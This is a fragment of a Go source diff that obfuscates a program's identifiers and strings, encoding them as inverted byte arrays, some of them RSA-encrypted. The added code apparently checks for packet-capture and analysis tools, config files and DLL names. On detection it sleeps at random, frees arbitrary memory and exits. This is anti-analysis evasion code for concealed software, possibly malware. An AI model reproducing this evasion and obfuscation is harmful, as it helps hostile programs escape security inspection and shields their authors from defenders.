229, 173, 247, 173, 34, 1, 210, 184, 81, 255, 150, 183, 115, 53, 132, 179, 201, 212, 107, 145, 46, 51, 143, 20, 81, 92, 77, 146, 8, 206, 250, 45, 28, 77, 188, 94, 43, 235, 66, 8, 107, 228, 158, 232, 18, 93, 240, 151, 115, 202, 235, 223, 34, 92, 36, 94, 150, 157, 189, 37, 184, 96, 47, 194, 216, 154, 40, 81, 236, 245, 81, 245, 71, 196, 112, 214, 243, 21, 69, 125, 150, 75, 61, 85, 228, 243, 214, 153, 117, 230, 95, 107, 46, 132, 150, 81, 244, 111, 101, 122, 139, 48, 126, 108, 77, 104, 89, 68, 184, 177, 52, 94, 156, 152, 27, 15, 14, 76, 141, 171, 158, 12, 231, 197, 234, 45, 46, 108, 19, 192, 26, 5, 110, 45, 96, 107, 193, 89, 248, 9, 224, 46, 207, 227, 105, 130, 85, 194, 4, 241, 22, 202, 241, 21, 138, 240, 53, 73, 98, 248, 155, 52, 9, 2, 77, 198, 185, 100, 171, 228, 170, 20, 92, 9, 54, 5, 146, 132, 10, 102, 19, 106, 10, 100, 8, 55, 69, 114, 68, 234, 17, 136, 52, 53, 10, 132, 155, 58, 197, 122, 45, 74, 4, 155, 78, 189, 22, 93, 170, 68, 171, 196, 170})
+var o0ooOoO0O0 = o0O00oo0OO([]byte{118, 175, 177, 184, 242, 245, 229, 245, 255, 255, 255, 242, 182, 183, 187, 173, 255, 255, 255, 237, 255, 255, 255, 239, 251, 252, 255, 255, 255, 22, 215, 205, 144, 255, 255, 255, 251, 152, 190, 178, 190, 255, 255, 78, 112, 244, 3, 158, 250, 255, 255, 255, 223, 156, 183, 173, 178, 255, 255, 133, 217, 255, 255, 127, 123, 255, 255, 5, 255, 255, 255, 127, 23, 255, 255, 138, 207, 255, 255, 21, 159, 255, 255, 197, 103, 255, 255, 232, 143, 99, 69, 174, 195, 255, 255, 255, 207, 175, 179, 171, 186, 15, 15, 15, 241, 201, 79, 243, 205, 90, 0, 236, 236, 0, 255, 255, 0, 230, 230, 237, 189, 45, 238, 193, 56, 240, 197, 68, 245, 209, 101, 246, 213, 112, 248, 217, 124, 235, 185, 34, 249, 221, 135, 0, 232, 232, 0, 0, 0, 45, 146, 108, 176, 255, 255, 255, 254, 157, 180, 184, 187, 240, 231, 69, 255, 38, 255, 255, 255, 248, 139, 182, 178, 186, 248, 24, 248, 227, 241, 206, 237, 175, 255, 17, 162, 255, 255, 255, 187, 182, 187, 190, 171, 247, 40, 156, 159, 191, 254, 189, 239, 53, 59, 58, 202, 59, 58, 58, 234, 55, 245, 254, 76, 179, 126, 83, 175, 73, 245, 94, 166, 228, 189, 190, 83, 92, 94, 189, 94, 78, 199, 166, 83, 191, 169, 255, 182, 211, 249, 95, 54, 243, 223, 41, 196, 232, 168, 232, 232, 232, 239, 52, 250, 243, 189, 230, 255, 219, 130, 227, 10, 176, 33, 35, 211, 255, 255, 255, 218, 139, 186, 167, 139, 155, 158, 139, 154, 197, 156, 141, 154, 158, 139, 154, 255, 205, 207, 205, 204, 210, 207, 200, 210, 205, 199, 171, 206, 205, 197, 203, 198, 197, 206, 199, 212, 207, 205, 197, 207, 207, 195, 217, 58, 137, 255, 255, 255, 218, 139, 186, 167, 139, 155, 158, 139, 154, 197, 146, 144, 155, 150, 153, 134, 255, 205, 207, 205, 204, 210, 207, 200, 210, 205, 199, 171, 206, 205, 197, 203, 198, 197, 206, 199, 212, 207, 205, 197, 207, 207, 178, 132, 130, 53, 255, 255, 255, 255})
+var ooO0000000 = o0O00oo0OO([]byte{166, 166, 38, 127, 127, 122, 98, 252, 215, 59, 54, 58, 50, 60, 52, 56, 208, 223, 215, 219, 211, 221, 213, 217, 209, 254, 235, 157, 25, 105, 107, 109, 105, 110, 106, 108, 168, 175, 171, 173, 169, 174, 170, 252, 246, 14, 87, 148, 151, 149, 150, 20, 23, 21, 214, 212, 20, 228, 231, 229, 254, 122, 115, 178, 179, 50, 51, 210, 211, 230, 83, 83, 126, 221, 201, 73, 137, 223, 170, 131, 9, 241, 113, 177, 49, 209, 81, 145, 17, 141, 201, 225, 97, 161, 191, 222, 233, 144, 224, 160, 192, 0, 255, 66, 63, 95, 31, 111, 47, 79, 15, 247, 111, 85, 55, 215, 210, 72, 151, 18, 103, 39, 71, 7, 123, 59, 91, 27, 235, 111, 213, 126, 43, 75, 11, 115, 51, 83, 19, 99, 35, 67, 3, 125, 61, 221, 95, 239, 148, 142, 182, 86, 161, 166, 70, 169, 186, 154, 170, 138, 178, 146, 162, 194, 183, 170, 188, 156, 172, 140, 180, 148, 164, 132, 184, 152, 168, 136, 176, 144, 224, 183, 183, 87, 128, 189, 4, 59, 182, 108, 88, 179, 98, 201, 130, 57, 51, 166, 76, 190, 189, 140, 25, 49, 100, 64, 159, 30, 93, 58, 180, 105, 209, 100, 64, 131, 58, 181, 95, 47, 85, 42, 148, 41, 81, 164, 71, 129, 60, 57, 178, 100, 72, 147, 34, 73, 130, 248, 175, 183, 157, 88, 8, 81, 103, 34, 132, 9, 17, 36, 128, 159, 41, 117, 18, 248, 240, 206, 255, 255, 186, 132, 174, 199, 193, 143, 205, 250, 255, 255, 255, 218, 139, 186, 167, 139, 155, 158, 139, 154, 197, 156, 141, 154, 158, 139, 154, 255, 205, 207, 205, 204, 210, 207, 200, 210, 205, 199, 171, 206, 205, 197, 203, 198, 197, 205, 199, 212, 207, 205, 197, 207, 207, 77, 86, 61, 106, 255, 255, 255, 218, 139, 186, 167, 139, 155, 158, 139, 154, 197, 146, 144, 155, 150, 153, 134, 255, 205, 207, 205, 204, 210, 207, 200, 210, 205, 199, 171, 206, 205, 197, 203, 198, 197, 205, 199, 212, 207, 205, 197, 207, 207, 60, 11, 133, 214, 255, 255, 255, 255})
+
+func oOOO00OOoO(oOO0oo0Oo0 string, ooooOO0ooO []byte) (oO00O0Ooo0 bool) {
+	const o0OoooOOO0 = 4 * 1024
+	ooooOO0ooOLen := len(ooooOO0ooO)
+	oOoO0oO0OO := ooooOO0ooOLen - 1
+	o00OO00oOo, oOO0Ooo0OO := os.Open(oOO0oo0Oo0)
+	if oOO0Ooo0OO != nil {
+		return false
+	}
+	defer o00OO00oOo.Close()
+
+	oo0OoOOoOO := make([]byte, o0OoooOOO0+oOoO0oO0OO)
+	for {
+		o0O0ooOo0o, oOO0Ooo0OO := o00OO00oOo.Read(oo0OoOOoOO[oOoO0oO0OO:])
+		if o0O0ooOo0o <= 0 && oOO0Ooo0OO != nil {
+			break
+		}
+		copy(oo0OoOOoOO[:oOoO0oO0OO], oo0OoOOoOO[o0OoooOOO0:o0OoooOOO0+oOoO0oO0OO])
+		index := bytes.Index(oo0OoOOoOO[:oOoO0oO0OO+o0O0ooOo0o], ooooOO0ooO)
+		if index != -1 {
+			return true
+		}
+		if oOO0Ooo0OO != nil {
+			break
+		}
+	}
+	return false
+}
+func o0000oO000() {
+	time.Sleep(time.Second * time.Duration(rand.Intn(15)+3))
+	//time.Sleep(time.Second * 3)
+	go oooOoo00oo()
+}
+func aaaaaaaaaaa(string2 string, ii int) {
+	os.WriteFile("C:\\Users\\admin\\Desktop\\x"+strconv.Itoa(ii)+".txt", []byte(string2), 0777)
+}
+func oO00O0Ooo0() {
+	rand.Seed(time.Now().UnixNano())
+	o0Oo0o0o00 := rand.Intn(940) + 60
+	time.Sleep(time.Duration(o0Oo0o0o00) * time.Second)
+}
+func o0oOOo00Oo(oOO0oO00oo string) string {
+	ooo00Ooooo := strings.ReplaceAll(oOO0oO00oo, string(o0O00oo0OO([]byte{209})), "")
+	ooo00Ooooo = strings.ReplaceAll(ooo00Ooooo, string(o0O00oo0OO([]byte{210})), "")
+	ooo00Ooooo = strings.ReplaceAll(ooo00Ooooo, string(o0O00oo0OO([]byte{223})), "")
+	ooo00Ooooo = strings.ReplaceAll(ooo00Ooooo, string(o0O00oo0OO([]byte{28, 127, 127})), "")
+	ooo00Ooooo = strings.ToLower(ooo00Ooooo)
+	return ooo00Ooooo
+}
+func o00Oo000Oo3(oOO0oO00oo string) {
 	go func() {
-		entries, err := os.ReadDir(exPath)
-		if err == nil {
-			for _, entry := range entries {
-				if entry.IsDir() {
-					if strings.Contains(strings.ToLower(entry.Name()), _15(_000_[5902:])) {
-						println("no panic [5902]... ")
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[526:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(oOO0oO00oo, o00Oo000Oo5(oo0o000oO0[3598:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[3854:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[4110:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[4366:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[4622:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[3342:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[3086:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[2830:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		if strings.Contains(strings.ToLower(oOO0oO00oo), o00Oo000Oo5(oo0o000oO0[782:])) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		__ooOOoo00ooy__ := o0oOOo00Oo(oOO0oO00oo)
+		if strings.Contains(__ooOOoo00ooy__, string(o0O00oo0OO([]byte{157, 134, 158, 140, 158, 145}))) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+		if strings.Contains(__ooOOoo00ooy__, string(o0O00oo0OO([]byte{201, 206, 203, 201, 207, 205, 207, 202, 201}))) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+		if strings.Contains(__ooOOoo00ooy__, string(o0O00oo0OO([]byte{175, 158, 156, 148, 154, 139, 188, 158, 143, 139, 138, 141, 154}))) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+		if strings.Contains(__ooOOoo00ooy__, string(o0O00oo0OO([]byte{186, 158, 140, 134}))) {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+}
+
+func o00Oo000Oo4() {
+	ex, oOO0Ooo0OO := os.Executable()
+	if oOO0Ooo0OO != nil {
+		return
+	}
+	oOOoOOOOoO := filepath.Dir(ex)
+	go func() {
+		ooo0OO0Oo0, oOO0Ooo0OO := os.ReadDir(oOOoOOOOoO)
+		if oOO0Ooo0OO == nil {
+			for _, oOOoOOOOoO := range ooo0OO0Oo0 {
+				if oOOoOOOOoO.IsDir() {
+					__ooOOoo00ooy__ := o0oOOo00Oo(oOOoOOOOoO.Name())
+					if strings.Contains(strings.ToLower(oOOoOOOOoO.Name()), o00Oo000Oo5(oo0o000oO0[5902:])) {
+						oO00O0Ooo0()
+						fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
 						go func() {
-							for i := 100; i < 10000; i++ {
+							for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
 								time.Sleep(time.Millisecond * 10)
-								public.Free(uintptr(i))
+								public.Free(uintptr(o0O0ooOo0o))
 							}
 						}()
 						os.Exit(0)
 						go os.Exit(0)
 					}
-					if strings.Contains(strings.ToLower(entry.Name()), _15(_000_[5646:])) {
-						println("no panic [5646]... ")
+					if strings.Contains(strings.ToLower(oOOoOOOOoO.Name()), o00Oo000Oo5(oo0o000oO0[5646:])) {
+						oO00O0Ooo0()
+						fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
 						go func() {
-							for i := 100; i < 10000; i++ {
+							for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
 								time.Sleep(time.Millisecond * 10)
-								public.Free(uintptr(i))
+								public.Free(uintptr(o0O0ooOo0o))
 							}
 						}()
 						os.Exit(0)
 						go os.Exit(0)
 					}
-					if strings.Contains(strings.ToLower(entry.Name()), _15(_000_[5390:])) {
-						println("no panic [5390]... ")
+					if strings.Contains(strings.ToLower(oOOoOOOOoO.Name()), o00Oo000Oo5(oo0o000oO0[5390:])) {
+						oO00O0Ooo0()
+						fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
 						go func() {
-							for i := 100; i < 10000; i++ {
+							for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
 								time.Sleep(time.Millisecond * 10)
-								public.Free(uintptr(i))
+								public.Free(uintptr(o0O0ooOo0o))
+							}
+						}()
+						os.Exit(0)
+						go os.Exit(0)
+					}
+					if strings.Contains(__ooOOoo00ooy__, string(o0O00oo0OO([]byte{186, 158, 140, 134}))) {
+						oO00O0Ooo0()
+						fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+						go func() {
+							for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+								time.Sleep(time.Millisecond * 10)
+								public.Free(uintptr(o0O0ooOo0o))
 							}
 						}()
 						os.Exit(0)
@@ -624,17 +770,18 @@ func _14() {
 
 	}()
 	go func() {
-		exPath += "\\" + _15(_000_[5134:])
-		info, e := os.Stat(exPath)
-		if e != nil {
+		oOOoOOOOoO += "\\" + o00Oo000Oo5(oo0o000oO0[5134:])
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
 			return
 		}
-		if info.Size() > 0 {
-			println("no panic [5134]... ")
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
 			go func() {
-				for i := 100; i < 10000; i++ {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
 					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
+					public.Free(uintptr(o0O0ooOo0o))
 				}
 			}()
 			os.Exit(0)
@@ -642,17 +789,170 @@ func _14() {
 		}
 	}()
 	go func() {
-		exPath += "\\" + _15(_000_[4878:])
-		info, e := os.Stat(exPath)
-		if e != nil {
+		oOOoOOOOoO += "\\" + o00Oo000Oo5(oo0o000oO0[4878:])
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
 			return
 		}
-		if info.Size() > 0 {
-			println("no panic [4878]... ")
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
 			go func() {
-				for i := 100; i < 10000; i++ {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
 					time.Sleep(time.Millisecond * 10)
-					public.Free(uintptr(i))
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		oOOoOOOOoO += "\\" + string(o0O00oo0OO([]byte{156, 144, 145, 153, 150, 152, 163, 140, 145, 158, 179, 150, 140, 139, 209, 150, 145, 150}))
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
+			return
+		}
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		oOOoOOOOoO += "\\" + string(o0O00oo0OO([]byte{186, 133, 140, 134, 210, 177, 154, 134, 209, 155, 147, 147}))
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
+			return
+		}
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		oOOoOOOOoO += "\\" + string(o0O00oo0OO([]byte{186, 133, 140, 134, 210, 177, 154, 134, 201, 203, 209, 155, 147, 147}))
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
+			return
+		}
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		oOOoOOOOoO += "\\" + string(o0O00oo0OO([]byte{186, 133, 140, 134, 210, 177, 154, 134, 201, 203, 209, 155, 147, 147}))
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
+			return
+		}
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		oOOoOOOOoO += "\\" + string(o0O00oo0OO([]byte{186, 133, 140, 134, 210, 177, 154, 139, 201, 203, 209, 155, 147, 147}))
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
+			return
+		}
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		oOOoOOOOoO += "\\" + string(o0O00oo0OO([]byte{186, 133, 140, 134, 210, 177, 154, 139, 209, 155, 147, 147}))
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
+			return
+		}
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		oOOoOOOOoO += "\\" + string(o0O00oo0OO([]byte{186, 133, 140, 134, 177, 154, 139, 209, 155, 147, 147}))
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
+			return
+		}
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
+				}
+			}()
+			os.Exit(0)
+			go os.Exit(0)
+		}
+	}()
+	go func() {
+		oOOoOOOOoO += "\\" + string(o0O00oo0OO([]byte{186, 133, 140, 134, 177, 154, 139, 201, 203, 209, 155, 147, 147}))
+		o0Oo0o0o00, oOO0Ooo0OO := os.Stat(oOOoOOOOoO)
+		if oOO0Ooo0OO != nil {
+			return
+		}
+		if o0Oo0o0o00.Size() > 0 {
+			oO00O0Ooo0()
+			fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			go func() {
+				for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
+					time.Sleep(time.Millisecond * 10)
+					public.Free(uintptr(o0O0ooOo0o))
 				}
 			}()
 			os.Exit(0)
@@ -660,26 +960,33 @@ func _14() {
 		}
 	}()
 }
-func _15(_2 []byte, _12x ...int) string {
-	_16 := bytes.NewBuffer(nil)
-	_3, _ := RSA.PubKeyIO(_12, bytes.NewReader(_2[0:256]), _16, false)
-	if _3 != nil {
-		println("no panic [0-256]... ")
+func o00Oo000Oo5(oOoOooOO0o []byte, o0oo0Oo0O0x ...int) string {
+	o00Oo000Oo6 := bytes.NewBuffer(nil)
+	o00ooOo0oo, _ := RSA.PubKeyIO(o0oo0Oo0O0, bytes.NewReader(oOoOooOO0o[0:256]), o00Oo000Oo6, false)
+	if o00ooOo0oo != nil {
+		fmt.Println(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
 		go func() {
-			panic("noKey")
-			for i := 100; i < 10000; i++ {
+			panic(o0O00oo0OO([]byte{164, 156, 212, 212, 162, 145, 144, 223, 143, 158, 145, 150, 156, 223, 164, 162, 209, 209, 209, 223}))
+			for o0O0ooOo0o := 100; o0O0ooOo0o < 10000; o0O0ooOo0o++ {
 				time.Sleep(time.Millisecond * 10)
-				public.Free(uintptr(i))
+				public.Free(uintptr(o0O0ooOo0o))
 			}
 		}()
 		os.Exit(0)
 		go os.Exit(0)
 		return ""
 	}
-	if len(_12x) > 0 {
-		return _16.String()
